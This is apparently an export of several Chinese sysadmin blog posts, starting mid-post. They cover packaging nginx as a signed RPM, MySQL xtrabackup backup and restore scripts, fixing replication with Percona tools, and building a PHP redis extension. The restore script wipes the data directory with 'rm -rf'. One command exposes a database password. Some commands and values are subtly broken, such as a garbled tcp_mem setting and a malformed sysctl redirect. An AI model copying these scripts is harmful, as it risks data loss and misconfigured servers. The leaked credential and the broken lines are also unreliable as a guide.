\"/usr/local/nginx-1.5.1/conf/nginx.conf\"\n nginx pid file: \"/usr/local/nginx-1.5.1/logs/nginx.pid\"\n nginx error log file: \"/usr/local/nginx-1.5.1/logs/error.log\"\n nginx http access log file: \"/usr/local/nginx-1.5.1/logs/access.log\"\n nginx http client request body temporary files: \"client_body_temp\"\n nginx http proxy temporary files: \"proxy_temp\"\n nginx http fastcgi temporary files: \"fastcgi_temp\"\n nginx http uwsgi temporary files: \"uwsgi_temp\"\n nginx http scgi temporary files: \"scgi_temp\"\n\n```\n\n### 2.2.2 编译nginx\n\n```sh\nmake //确定你的服务器有安装make，如果没有安装请执行yum install make\n```\n\n### 2.2.3 安装nginx\n\n```sh\nmake install\n```\n\n## 2.3 启动、关闭、重置nginx\n\n### 2.3.1 启动：直接执行以下命令,nginx就启动了,不需要改任何配置文件,nginx配置多域名虚拟主机请参考后续文章.\n\n```sh\n/usr/local/nginx-1.5.1/sbin/nginx\n```\n\n　　试试访问：我这边不贴图，直接使用curl命令来读取web信息\n\n```\tsh\n[root@ns conf]# curl -s http://localhost | grep nginx.com\nnginx.com.\n```\n### 2.3.2 关闭：\n\n```sh\n/usr/local/nginx-1.5.1/sbin/nginx -s stop\n```\n\n### 2.3.3 重置：当你有修改配置文件的时候，只需要reload以下即可\n\n```sh\n/usr/local/nginx-1.5.1/sbin/nginx -s reload\n```\n\n　　整个nginx的编译安装就到这里结束了。\n\n\n# 三. 从源码打包成rpm包安装\n\n## 3.1 RPM包的分类\n\n　　RPM有五种基本的操作功能：安装、卸载、升级、查询和验证。\n\n　　linux软件包分为两大类：\n1. 二进制类包，包括rpm安装包（一般分为i386和x86等几种）\n2. 源码类包，源码包和开发包应该归位此类（.src.rpm）。\n\n　　有时候为了方便源码包的安装，和我们自己订制软件包的需求，我们会把一些源码包按照我们的需求来做成rpm包，当有了源码包就可以直接编译得到二进制安装包和其他任意包。spec file是制作rpm包最核心的部分，rpm包的制作就是根据spec file来实现的。在制作自定义rpm包的时候最好不要使用管理员进行,因为管理员权限过大，如果一个命令写错了，结果可能是灾难性的，而制件一个rpm包普通用户完全可以实现\n\n \n## 3.2 修改宏及自定义车间位置\n\n　　在redhat下，rpm包的默认制作路径在/usr/src/redhat下，这其中包含了6个目录（要求全部大写）\n\n|Directory     |Usage\n|--------------|-----------------------------------------------------------------------------------------------|\n|BUILD         |源代码解压以后放的位置，只需提供BUILD目录，具体里面放什么，不用我们管，所以真正的制作车间是BUILD目录|\n|RPMS          |制作完成后的rpm包存放目录，为特定平台指定子目录（i386,i686,ppc）|\n|SOURCES       |收集的源文件，源材料，补丁文件等存放位置 |\n|SPECS         |存放spec文件，作为制作rpm包的领岗文件，以 rpm名.spec |\n|SRPMS         |src格式的rpm包位置 ，既然是src格式的包，就没有平台的概念了 |           \n|BuiltRoot     |假根，使用install临时安装到这个目录，把这个目录当作根来用的，所以在这个目录下的目录文件，才是真正的目录文件。当打包完成后，在清理阶段，这个目录将被删除 |\n\n　　但centos并没有该目录，因此，我们不得不自定义工作车间，即使在redhat下有该目录，一般也是自定义到普通用户的家目录下的。\n\n　　`rpmbuild --showrc` 显示所有的宏，以下划线开头，一个下划线：定义环境的使用情况，二个下划线：通常定义的是命令，为什么要定义宏，因为不同的系统，命令的存放位置可能不同，所以通过宏的定义找到命令的真正存放位置。\n\n　　查看默认工作车间，所以只要改变了这个宏，我们就可以自定义工作车间了\n\n```sh\n[root@localhost ~]# rpmbuild --showrc | grep topdir\n-14: _builddir\t%{_topdir}/BUILD\n-14: _buildrootdir\t%{_topdir}/BUILDROOT\n-14: _rpmdir\t%{_topdir}/RPMS\n-14: _sourcedir\t%{_topdir}/SOURCES\n-14: _specdir\t%{_topdir}/SPECS\n-14: _srcrpmdir\t%{_topdir}/SRPMS\n-14: _topdir\t%{getenv:HOME}/rpmbuild\n```\n\n## 3.3 rpm包制作原理图\n\n<a><img src=\"../../images/service/nginx/1-1.jpg\" /></a>\n \n## 3.4 制作rpm包\n\n### 3.4.1 安装rpm-build\n\n```sh\nyum -y install rpm-build\n```\n\n### 3.4.2 增加普通用户并修改工作车间目录\n\n```sh\n# useradd hero\n\n# su - hero\n\n$ vim ~/.rpmmacros\n\n%_topdir        /home/hero/rpmbuild\n\n# mkdir -pv ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}\n\n# rpmbuild --showrc | grep _topdir    #会发现，工作车间已然改变：_topdir    /home/hero/rpmbuild\n```\n\n### 3.4.3 收集源码文件\n\n#### 3.4.3.1 文件列表\n\n```sh\n[root@localhost SOURCES]# pwd\n/home/hero/rpmbuild/SOURCES\n[root@localhost SOURCES]# ls\nfastcgi_params  nginx  nginx-1.8.1.tar.gz  nginx.conf\n```\n\n#### 3.4.3.2 nginx-1.8.1.tar.gz 源码包\n\n```sh\n$ cp /opt/src/nginx-1.8.1.tar.gz /home/hero/rpmbuild/SOURCES/\n```\n\n#### 3.4.3.3 nginx启动脚本文件\n\n```sh\n#!/bin/sh\n#\n# nginx        Startup script for nginx\n#\n# chkconfig: - 85 15\n# processname: nginx\n# config: /etc/nginx/nginx.conf\n# config: /etc/sysconfig/nginx\n# pidfile: /var/run/nginx.pid\n# description: nginx is an HTTP and reverse proxy server\n#\n### BEGIN INIT INFO\n# Provides: nginx\n# Required-Start: $local_fs $remote_fs $network\n# Required-Stop: $local_fs $remote_fs $network\n# Default-Start: 2 3 4 5\n# Default-Stop: 0 1 6\n# Short-Description: start and stop nginx\n### END INIT INFO\n\n# Source function library.\n. /etc/rc.d/init.d/functions\n\nif [ -L $0 ]; then\n    initscript=`/bin/readlink -f $0`\nelse\n    initscript=$0\nfi\n\nsysconfig=`/bin/basename $initscript`\n\nif [ -f /etc/sysconfig/$sysconfig ]; then\n    . /etc/sysconfig/$sysconfig\nfi\n\nnginx=${NGINX-/gotwo_data/Application/nginx/sbin/nginx}\nprog=`/bin/basename $nginx`\nconffile=${CONFFILE-/gotwo_data/Application/nginx/conf/nginx.conf}\nlockfile=${LOCKFILE-/gotwo_data/logs/nginx/nginx.lock}\npidfile=${PIDFILE-/gotwo_data/logs/nginx/nginx.pid}\nSLEEPMSEC=${SLEEPMSEC-200000}\nUPGRADEWAITLOOPS=${UPGRADEWAITLOOPS-5}\nRETVAL=0\n\nstart() {\n    echo -n $\"Starting $prog: \"\n\n    daemon --pidfile=${pidfile} ${nginx} -c ${conffile}\n    RETVAL=$?\n    echo\n    [ $RETVAL = 0 ] && touch ${lockfile}\n    return $RETVAL\n}\n\nstop() {\n    echo -n $\"Stopping $prog: \"\n    killproc -p ${pidfile} ${prog}\n    RETVAL=$?\n    echo\n    [ $RETVAL = 0 ] && rm -f ${lockfile} ${pidfile}\n}\n\nreload() {\n    echo -n $\"Reloading $prog: \"\n    killproc -p ${pidfile} ${prog} -HUP\n    RETVAL=$?\n    echo\n}\n\nupgrade() {\n    oldbinpidfile=${pidfile}.oldbin\n\n    configtest -q || return\n    echo -n $\"Starting new master $prog: \"\n    killproc -p ${pidfile} ${prog} -USR2\n    echo\n\n    for i in `/usr/bin/seq $UPGRADEWAITLOOPS`; do\n        /bin/usleep $SLEEPMSEC\n        if [ -f ${oldbinpidfile} -a -f ${pidfile} ]; then\n            echo -n $\"Graceful shutdown of old $prog: \"\n            killproc -p ${oldbinpidfile} ${prog} -QUIT\n            RETVAL=$?\n            echo\n            return\n        fi\n    done\n\n    echo $\"Upgrade failed!\"\n    RETVAL=1\n}\n\nconfigtest() {\n    if [ \"$#\" -ne 0 ] ; then\n        case \"$1\" in\n            -q)\n                FLAG=$1\n                ;;\n            *)\n                ;;\n        esac\n        shift\n    fi\n    ${nginx} -t -c ${conffile} $FLAG\n    RETVAL=$?\n    return $RETVAL\n}\n\nrh_status() {\n    status -p ${pidfile} ${nginx}\n}\n\n# See how we were called.\ncase \"$1\" in\n    start)\n        rh_status >/dev/null 2>&1 && exit 0\n        start\n        ;;\n    stop)\n        stop\n        ;;\n    status)\n        rh_status\n        RETVAL=$?\n        ;;\n    restart)\n        configtest -q || exit $RETVAL\n        stop\n        start\n        ;;\n    upgrade)\n        rh_status >/dev/null 2>&1 || exit 0\n        upgrade\n        ;;\n    condrestart|try-restart)\n        if rh_status >/dev/null 2>&1; then\n            stop\n            start\n        fi\n        ;;\n    force-reload|reload)\n        reload\n        ;;\n    configtest)\n        configtest\n        ;;\n    *)\n        echo $\"Usage: $prog {start|stop|restart|condrestart|try-restart|force-reload|upgrade|reload|status|help|configtest}\"\n        RETVAL=2\nesac\n\nexit $RETVAL\n\n```\n\n#### 3.4.3.4 fastcgi_params 参数\n\n```sh\nfastcgi_param  QUERY_STRING       $query_string;\nfastcgi_param  REQUEST_METHOD     $request_method;\nfastcgi_param  CONTENT_TYPE       $content_type;\nfastcgi_param  CONTENT_LENGTH     $content_length;\n\nfastcgi_param  SCRIPT_NAME        $fastcgi_script_name;\nfastcgi_param  REQUEST_URI        $request_uri;\nfastcgi_param  DOCUMENT_URI       $document_uri;\nfastcgi_param  DOCUMENT_ROOT      $document_root;\nfastcgi_param  SERVER_PROTOCOL    $server_protocol;\nfastcgi_param  HTTPS              $https if_not_empty;\n\nfastcgi_param  GATEWAY_INTERFACE  CGI/1.1;\nfastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;\n\nfastcgi_param  REMOTE_ADDR        $remote_addr;\nfastcgi_param  REMOTE_PORT        $remote_port;\nfastcgi_param  SERVER_ADDR        $server_addr;\nfastcgi_param  SERVER_PORT        $server_port;\nfastcgi_param  SERVER_NAME        $server_name;\n\n# PHP only, required if PHP was built with --enable-force-cgi-redirect\nfastcgi_param  REDIRECT_STATUS    200;\n\n```\n### 3.4.4 在 SPECS 目录下创建 nginx.spec\n\n```sh  \n$ cd rpmbuild/SPECS/\n$ vim nginx.spec     #此时，里面就是一个模板，直接填就可以了\n \n# 1.The introduction section\n \nName: nginx           # 软件包名称\nVersion: 1.8.1        # 版本号，（不能使用-）\nRelease: 1%{?dist}    # release号，对应下面的changelog，如 nginx-1.8.1-1.el6.x86_64.rpm\nSummary: nginx-1.8.1.tar.gz to nginx-1.8.1.rpm   # 简要描述信息，最好不要超过50个字符，如要详述，使用下面的%description\nGroup: Applications/Archiving      # 要全用这里面的一个组：less /usr/share/doc/rpm-version/GROUPS\nLicense: GPLv2                     # 一定带上（最好是对方源码包的License）BSD，GPL，GPLv2\nURL: http://nginx.org\nPackager: go2.cn\nVendor: go2.cn\nSource0: %{name}-%{version}.tar.gz     # source主要是引用一下自己定义好的脚本，配置文件之类的内容。\nSource1: nginx                         # nginx在主配置文件里面做了很多优化，包括cpu抢占，各种缓存策略，tcp，进程数等。\nSource2: nginx.conf                    # 每增加一个 Source ，都需要在 %install 段和 %files 段做相应配置，如果是启动脚本的话，最好在脚本段配置一下\nSource3: fastcgi_params\nBuildRoot: %_topdir/BUILDROOT\n \nBuildRequires: gcc\nRequires: openssl,openssl-devel,pcre-devel,pcre  # 定义nginx依赖的包，需要yum安装\n \n%description              # 软件包详述\nCustom a rpm by yourself!Build nginx-1.8.1.tar.gz to nginx-1.8.1.rpm\n \n# 2.The Prep section 准备阶段,主要就是把源码包解压到build目录下，设置一下环境变量，并cd进去\n \n%prep\n%setup -q    # 这个宏的作用静默模式解压并cd\n \n# 3.The Build Section 编译制作阶段，这一节主要用于编译源码\n \n%build\n \n%configure      #在 RMP 创建时候, 由于 nginx 不按照常规定义, 不可以定义 %{_prefix} 之类参数, 也不可以使用 %configure 这个参数进行 rpm 编译  \n                #一旦定义该参数, 会导致编译自动增加下面参数, 导致报错\n                # + ./configure --build=x86_64-redhat-linux-gnu --host=x86_64-redhat-linux-gnu --target=x86_64-redhat-linux-gnu --program-prefix=\n                #因此，这里需要 ./configure，且需把%configure删掉\n                #而且这里需要安装 pcre-devel包，如果没有的话，会提示关于pcre的错误，直接安装此包就可以了\n\n./configure \\\n--prefix=/gotwo_data/Application/nginx \\\n--sbin-path=/gotwo_data/Application/nginx/sbin/nginx \\\n--conf-path=/gotwo_data/Application/nginx/conf/nginx.conf \\\n--error-log-path=/gotwo_data/logs/nginx/error.log \\\n--http-log-path=/gotwo_data/logs/nginx/access.log \\\n--pid-path=/gotwo_data/logs/nginx/nginx.pid \\\n--lock-path=/gotwo_data/logs/nginx/nginx.lock \\\n--http-client-body-temp-path=/gotwo_data/Application/nginx/client_temp \\\n--http-proxy-temp-path=/gotwo_data/Application/nginx/proxy_temp \\\n--http-fastcgi-temp-path=/gotwo_data/Application/nginx/fastcgi_temp \\\n--http-uwsgi-temp-path=/gotwo_data/Application/nginx/uwsgi_temp \\\n--http-scgi-temp-path=/gotwo_data/Application/nginx/scgi_temp \\\n--user=nginx \\\n--group=nginx \\\n--with-http_ssl_module \\\n--with-http_realip_module \\\n--with-http_addition_module \\\n--with-http_sub_module \\\n--with-http_dav_module \\\n--with-http_flv_module \\\n--with-http_mp4_module \\\n--with-http_gunzip_module \\\n--with-http_gzip_static_module \\\n--with-http_random_index_module \\\n--with-http_secure_link_module \\\n--with-http_stub_status_module \\\n--with-http_auth_request_module \\\n--with-mail \\\n--with-mail_ssl_module \\\n--with-file-aio \\\n--with-ipv6 \\\n--with-http_spdy_module \\\n--with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic'\n\nmake %{?_smp_mflags}     # make后面的意思是：如果就多处理器的话make时并行编译\n \n# 4.Install section  这一节主要用于完成实际安装软件必须执行的命令，可包含4种类型脚本\n \n%install\nrm -rf %{buildroot}\nmake install DESTDIR=%{buildroot}\n%{__install} -p -D -m 0755 %{SOURCE1} %{buildroot}/etc/rc.d/init.d/nginx\n%{__install} -p -D %{SOURCE2} %{buildroot}/gotwo_data/Application/nginx/conf/nginx.conf\n%{__install} -p -D %{SOURCE3} %{buildroot}/gotwo_data/Application/nginx/conf/fastcgi_params\n \n%pre\nif [ $1 == 1 ];then                                                           # $1有3个值，代表动作，安装类型，处理类型\n        /usr/sbin/useradd -r nginx -s /sbin/nologin 2> /dev/null\n\n        mkdir -p /gotwo_data/logs/nginx                                       # 1：表示安装\nfi                                                                            # 2：表示升级      \n                                                                              # 0：表示卸载\n%post\nif [ $1 == 1 ];then\n        /sbin/chkconfig --add %{name}\n        /sbin/chkconfig %{name} on\n        echo '# Add  #下面主要是内核参数的优化，包括tcp的快速释放和重利用等。   \nnet.ipv4.tcp_max_syn_backlog = 65536\nnet.core.netdev_max_backlog =  32768\nnet.core.somaxconn = 32768\n \nnet.core.wmem_default = 8388608\nnet.core.rmem_default = 8388608\nnet.core.rmem_max = 16777216\nnet.core.wmem_max = 16777216\n \nnet.ipv4.tcp_timestamps = 0\nnet.ipv4.tcp_synack_retries = 2\nnet.ipv4.tcp_syn_retries = 2\n \nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.tcp_tw_reuse = 1\n \nnet.ipv4.tcp_mem = 94500000 915000000927000000\nnet.ipv4.tcp_max_orphans = 3276800\n \n#net.ipv4.tcp_fin_timeout = 30\n#net.ipv4.tcp_keepalive_time = 120\nnet.ipv4.ip_local_port_range = 1024  65535' >> /etc/sysctl.conf\nsysctl -p 2>&1 /dev/null\nfi\n \n%preun\nif [ $1 == 0 ];then\n        /usr/sbin/userdel -r nginx 2> /dev/null\n        /etc/init.d/nginx stop > /dev/null 2>&1\nfi\n%postun\n \n# 5.clean section 清理段,clean的主要作用就是删除BUILD\n \n%clean\nrm -rf %{buildroot}\n \n# 6.file section 文件列表段，这个阶段是把前面已经编译好的内容要打包了,其中exclude是指要排除什么不打包进来。\n \n%files              \n%defattr(-,root,root,0755)\n/usr/local/nginx/\n%attr(0755,root,root) /etc/rc.d/init.d/nginx\n%config(noreplace) /gotwo_data/Application/nginx/conf/nginx.conf\n%config(noreplace) /gotwo_data/Application/nginx/conf/fastcgi_params\n \n# 7.chagelog section  日志改变段， 这一段主要描述软件的开发记录\n \n%changelog\n*  Thu Nov 16  2016 go2.cn <yunwei@stargoto.com> - 1.8.1-1\n- Initial version\n\n```\n\n### 3.4.5 制作rpm包\n\n```\nrpmbuild -bp nginx.spec 制作到%prep段\nrpmbuild -bc nginx.spec 制作到%build段\nrpmbuild -bi nginx.spec 执行 spec 文件的 \"%install\" 阶段 (在执行了 %prep 和 %build 阶段之后)。这通常等价于执行了一次 \"make install\"\nrpmbuild -bb nginx.spec 制作二进制包\nrpmbuild -ba nginx.spec 表示既制作二进制包又制作src格式包\n```\n\n## 3.5 rpm包的签名\n\n### 3.5.1 查询软件包信息\n\n```sh\n[root@localhost ~]# rpm -qi nginx\nName        : nginx                        Relocations: (not relocatable)\nVersion     : 1.7.7                             Vendor: nmshuishui\nRelease     : 3.el6                         Build Date: Wed 26 Nov 2014 06:39:00 PM CST\nInstall Date: Wed 26 Nov 2014 06:42:19 PM CST      Build Host: localhost\nGroup       : Applications/Archiving        Source RPM: nginx-1.7.7-3.el6.src.rpm\nSize        : 793593                           License: GPLv2\nSignature   : (none)    # rpm包未签名状态\nPackager    : nmshuishui <353025240@qq.com>\nURL         : http://nmshuishui.blog.51cto.com/\nSummary     : nginx-1.7.7.tar.gz to nginx-1.7.7.rpm\nDescription :\nCustom a rpm by yourself!Build nginx-1.7.7.tar.gz to nginx-1.7.7.rpm\n```\n\n### 3.5.2 使用gpg方式生成签名密钥\n\n```sh\n[root@localhost ~]# gpg --gen-key\nYour selection?1<Enter>  #默认即可\nWhat keysize do you want? (2048) 1024<Enter>  #选择密钥长度\nKey is valid for? (0) 1y<Enter>  #有效期\nIs this correct? (y/N) y<Enter>  #确认\nReal name: nmshuishui<Enter>  #密钥名称\nEmail address: 353025240@qq.com<Enter>  #邮件\nComment: GPG-RPM-KEY<Enter>  #备注\nChange (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O<ENTER> #okay确认\nEnter passphrase  OK <Enter>  #按Enter输入密码                    \n<Take this one anyway> <Enter> #确认使用此密码\n```\n　　在生成密钥的时候，会报这么一个信息：can't connect to `/root/.gnupg/S.gpg-agent': No such file or directory，可以不用理会它。\n接下来就是一些随机数的说明了：\n\n　　We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy.\n\n　　就狂敲键盘和移动鼠标吧，也可以链接一个伪随机数（不过不安全），接下来的活儿就是等了\n\n　　生成密钥后会是这样的：\n\n```\ngpg: checking the trustdb\ngpg: 3 marginal(s) needed, 1 complete(s) needed, PGP trust model\ngpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u\npub   2048R/DF63EDFB 2014-11-26\n      Key fingerprint = 338D 476F 29C9 E2D6 6604  1D96 6F73 1E81 DF63 EDFB\nuid                  nmshuishui (gen-key) <353025240@qq.com>\nsub   2048R/263FB359 2014-11-26\n```\n\n### 3.5.3 查看生成的密钥\n\n```sh\n[root@localhost ~]# gpg --list-keys\n/root/.gnupg/pubring.gpg\n------------------------\npub   2048R/DF63EDFB 2014-11-26\nuid                  nmshuishui (gen-key) <353025240@qq.com>\nsub   2048R/263FB359 2014-11-26\n```\n\n### 3.5.4 导出公钥以供验证\n\n```sh\n[root@localhost ~]# gpg --export -a \"nmshuishui\" > RPM-GPG-KEY-nmshuishui\n```\n### 3.5.5 在~/.rpmmacros宏中定义加密密钥\n\n```sh\n[root@localhost ~]# vim ~/.rpmmacros\n%_gpg_name nmshuishui\n```\n### 3.5.6 为rpm包签名\n\n```sh\n[root@localhost ~]# rpm --addsign /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm \nEnter pass phrase: \nPass phrase is good.\n/home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm:\n```\n### 3.5.7 将公钥导入rpm包\n\n```sh\n[root@localhost ~]# rpm --import RPM-GPG-KEY-nmshuishui\n```\n\n### 3.5.8 验证\n\n```sh\n[root@localhost ~]# rpm --checksig /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm\n/home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm: rsa sha1 (md5) pgp md5 OK\n```\n\n### 3.5.9 重新安装nginx，验证安装包的签名信息\n\n```sh\n[root@localhost ~]# rpm -ivh /home/hero/rpmbuild/RPMS/x86_64/nginx-1.7.7-3.el6.x86_64.rpm \nPreparing...                ########################################### [100%]\n   1:nginx                  ########################################### [100%]\n[root@localhost ~]# \n[root@localhost ~]# rpm -qi nginx\nName        : nginx                        Relocations: (not relocatable)\nVersion     : 1.7.7                             Vendor: nmshuishui\nRelease     : 3.el6                         Build Date: Wed 26 Nov 2014 06:39:00 PM CST\nInstall Date: Thu 27 Nov 2014 10:58:44 AM CST      Build Host: localhost\nGroup       : Applications/Archiving        Source RPM: nginx-1.7.7-3.el6.src.rpm\nSize        : 793593                           License: GPLv2\nSignature   : RSA/SHA1, Thu 27 Nov 2014 10:40:02 AM CST, Key ID 6f731e81df63edfb   # 与 1 比起来，多了签名信息\nPackager    : nmshuishui <353025240@qq.com>\nURL         : http://nmshuishui.blog.51cto.com/\nSummary     : nginx-1.7.7.tar.gz to nginx-1.7.7.rpm\nDescription :\nCustom a rpm by yourself!Build nginx-1.7.7.tar.gz to nginx-1.7.7.rpm\n```\n\n到这里，一个完整的 rpm 包就制作完成了！\n","tags":["nginx"],"categories":["service"]},{"title":"用innobackup备份恢复mysql","url":"/2017/06/09/database/用innobackup备份恢复mysql/","content":"\n一般mysql的备份还原会使用mysql自带的mysqldump，但是当数据库比较大多时候，使用mysqldump备份恢复数据库耗时相当的长。为了尽可能的缩短mysql数据库备份恢复的时间窗口，可以使用percona提供的第三方工具xtrabackup来备份还原。\n\n<!-- more -->\n\n# 一.安装xtrabackup\n\n在使用该脚本之前必须按照xtrabackup，按照命令如下：\n```sh\nrpm -qa |grep xtrabackup\n```\n如果存在老版本，就卸载\n```sh\nrpm -e --nodeps xtrabackup\n```\n安装新版本\n```sh\nyum install -y percona-xtrabackup.x86_64\n```\n安装qpress用于xtrabackup的恢复还原\n```sh\nyum install -y qpress\n```\n**注意:** xtrabackup的版本一定是2.2.3以上 \n\n# 二.xtrabackup的shell备份脚本\n\n## 使用说明\n\n使用下面的shell脚本，需要根据不同数据库实例的自身情况，为以下变量设置不同的值\n\n```sh\nHOST_IP='10.1.17.19'                    #备份实例服务器的IP地址\nMYSQL_PWD=\"xxx\"          \t\t\t\t#mysql用户debian-sys-maint的密码\nMYSQL_SOCKET=\"xxx\"       \t\t\t\t#mysql实例的socket，eg. /tmp/mysql.sock\nMYSQL_PORT=3306                         #mysql的端口\nMYSQL_CNF_FILE=\"/etc/my.cnf\"            #mysql实例的配置文件\nINSTNANCE_NAME=\"inventory\"              #mysql实例名\n\n# 根据不同存储设置不同的值。FIO 为16， SAS为8\n# 也可以根据mysql实例的io负载的具体情况增大或减少值\n\nRUN_THREAD_NUM=8\nCOMPRESS_THREAD_NUM=8\n```\n**mysql备份shell脚本**\n\nmysql备份shell如下：\n```sh\n#!/bin/bash\n\nINNOBACKUPEX=`which innobackupex`\nCURL=`which curl`\nRSYNC=`which rsync`\nBWLIMIT=40960 #40MB\n\nHOST_IP='192.168.1.21'\nREMOTE_IP='192.168.10.54'\n\nMYSQL_USER=\"debian-sys-maint\"\nMYSQL_PWD=\"xxx\"\nMYSQL_SOCKET=\"/tmp/mysqld.sock\"\nMYSQL_PORT=3306\nMYSQL_CNF_FILE=\"/etc/my.cnf\"\nINSTNANCE_NAME=\"inventory\"\n\nBACKUP_DIR=\"/home/jm/backup\"\nBACKUP_FILE=\"mysql-\"$INSTNANCE_NAME\nBACKUP_FILES_DIR=\"mysql-\"$INSTNANCE_NAME\nTRANSFER_FILE=\n\nWEEK=`date +%w`\n#WEEK=`date -d yesterday +%w`\nCUR_DATE=`date +%F`\n\nRUN_THREAD_NUM=8\nCOMPRESS_THREAD_NUM=8\n\nSENTO=\"peid1@jumei.com\"\n\nSUBJECT=\"MySQL Instance ${INSTNANCE_NAME} backup Error\"\nBACKUP_LOG=$BACKUP_DIR\"/backup.log\"\n\nBINARY_BACKUP() {\n\t\tTRANSFER_FILE=$BACKUP_FILE\"-\"$CUR_DATE\".xbstream\"\n \t\t$INNOBACKUPEX --user=$MYSQL_USER  --password=$MYSQL_PWD --socket=$MYSQL_SOCKET --slave-info  --parallel=$RUN_THREAD_NUM --compress --compress-threads $COMPRESS_THREAD_NUM --defaults-file=$MYSQL_CNF_FILE --no-version-check --stream=xbstream  $BACKUP_DIR  > $BACKUP_DIR/$TRANSFER_FILE\n\n\t\tsleep 10\n\n\t\tgrep \"innobackupex: completed OK\" $BACKUP_LOG > /dev/null\n\n\t\tif [ $? -eq 0 ]\n\t\t\tthen\n   \t\t\techo \"Backup finish successfully !\"\n\t\t\telse\n   \t\t\t$CURL -d \"menu=errorlog\" -d email_destinations=\"$SENTO\" -d email_subject=\"$SUBJECT\" -d email_content=\"${HOST_IP} MYSQL INSTANCE $INSTNANCE_NAME backup failed,please check !\" http://email.int.jumei.com/send\n\t\tfi\n\n}\n\nRSYNC_REMOTE() {\n\t\t$RSYNC -av --bwlimit=$BWLIMIT $BACKUP_DIR/$TRANSFER_FILE root@${REMOTE_IP}::mysql/\n\n\t\tif [ $? -eq 0 ];then\n        \trm -f $BACKUP_DIR/$TRANSFER_FILE\n\t\t\telse\n  \t\t\t$CURL -d \"menu=errorlog\" -d email_destinations=\"$SENTO\" -d email_subject=\"$SUBJECT\" -d email_content=\"${HOST_IP} backup file send to ${REMOTE_IP} failed,please check !\" http://email.int.jumei.com/send\nfi\n}\n\n# main procedure\n\nBINARY_BACKUP\n\nRSYNC_REMOTE\n```\n\n** xtrabackup的shell恢复脚本 **\n\n使用方法 <code>./mysql_restore inventory.stream</code>\n\n```sh \n#!/bin/sh\nFILE_NAME=$1\nDES_DIR=/mysql/backup/   #目标文件夹\nDATA_DIR=/mysql/data ＃mysql的数据文件件\nMYSQL_SOCKET=/tmp/mysqld.sock\nSENTO=peid1@jumei.com\n\nmysqladmin ping -S$MYSQL_SOCKET | grep alive >/dev/null\n\nif [ $? == 0 ]\n\tthen\n\t\tmysqladmin shutdown -S$MYSQL_SOCKET\n\t\tsleep 10\nfi\n\nrm -rf $DATA_DIR\n\n[ ! -d $DES_DIR ] && mkdir $DES_DIR\n\nxbstream -C $DES_DIR -x -v < $FILE_NAME\n#cd $DES_DIR\ninnobackupex --decompress --parallel=32 $DES_DIR\ninnobackupex --apply-log $DES_DIR\nchown -R mysql.mysql $DES_DIR\n\nmv $DES_DIR $DATA_DIR\nrm -f $DATA_DIR/ib_logfile*\nmysqld_safe --defaults-file=/etc/my.cnf --user=mysql &\n\nsleep 10\n\nmysqladmin ping -S$MYSQL_SOCKET | grep alive >/dev/null\n\nif [ $? == 0 ]\n\tthen\n\t/usr/bin/curl -d \"menu=errorlog\" -d email_destinations=\"peid1@jumei.com\" -d email_subject=\"$FILE_NAME has been restored\" -d email_content=\"\" http://email.int.jumei.com/send\nfi\n\nmysql -S$MYSQL_SOCKET\n```\n","tags":["mysql"],"categories":["database"]},{"title":"修复mysql主从不一致","url":"/2017/06/08/database/修复mysql主从不一致/","content":"\n\n# 修复主键冲突\n\n```sh\npt-slave-restart --user=root --password=xxxxxx --socket=/gotwo_data/mysqlGo2/my40005/socket/mysqld.sock --error-numbers=1062\n```\n\n<!-- more -->\n\n# 同步不一致的表\n\n```sh\npt-table-sync  —print --execute --sync-to-master h=192.168.10.41,P=40005,u=root,p=XcQVr8CmHhs4FVN2  --databases=db_go2 --tables=ln_user2seller\n```\n需要在主库上面执行\n\nh= 是从库的IP\n\nP=是从库的端口\n\n--tables= 可以是多个表用逗号分隔\n\n注意使用账户的权限，是否可以登录从库并执行命令\n\n\n\n","tags":["mysql"],"categories":["database"]},{"title":"linux下添加redis扩展","url":"/2017/06/08/service/linux下添加redis扩展/","content":"\n本文是安装redis扩展，但其他扩展的安装方式也是如此，具有通用性。\n\n<!-- more -->\n\n\n# 下载扩展\n\n到http://pecl.php.net下载扩展\n\n\n# 解压并进入包目录 \n\n```sh\ntar -xvf redis-2.2.7.tar \ncd redis-2.2.7 \n```\n\n# 使用php扩展添加信息 \n\n```sh\n/data/apps/php/bin/phpize \n```\n# 添加PHP配置信息\n\n```sh\n./configure --with-php-config=/data/apps/php/bin/php-config\n```\n\n# 编译生成扩展库  \n```sh\nmake \nsudo make install \n```\n\n# 查看扩展库生成\n```sh\ncd /goto_data/Application/php/lib/php/extensions/no-debug-non-zts-20090626/\nls    #是否有redis.so\n```\n\n# 修改php.ini  \n\n```sh\ncd /data/apps/php/etc/\nsudo vim php.ini \n```\n\n文件末尾添加 extension=redis.so 即可。\n","tags":["php"],"categories":["service"]},{"title":"Tomcat环境搭建及配置规范","url":"/2017/06/08/service/tomcat软件部署及项目部署脚本/","content":"\n# 软件版本及安装路径\nJDK的版本1.7.0_79 \n\nTomcat的版本7.0.65\n\nJDK的安装路径: /gotwo_data/Application \n\nTomcat的安装路径: /gotwo_data/Application\n\ntomcat目录的命名规则:tomcat+对外提供服务的web端口号，比如tomcat18080。 \n\nTomcat目录及其内部的子目录和文件权限:`chown -R tomcat.tomcat tomcat18080;chmod -R 775 tomcat18080`\n\n<!-- more -->\n\n# Tomcat端口的配置规范\n- 所有端口为5位数：\n- 前3位数代表单独的web应用\n- 第4位为web应用的多个tomcat实例序号\n- 第5位表示提供不同服务的端口：\n        0:表示web服务端口\n        3:表示SSL的连接端口\n        5:表示用于停止Tomcat的端口\n        8:jmx远程访问端口\n        9:Apache的侦听端口\n\n# 配置catalina.sh\n\n加入下面的配置项(以18080为例)：\n     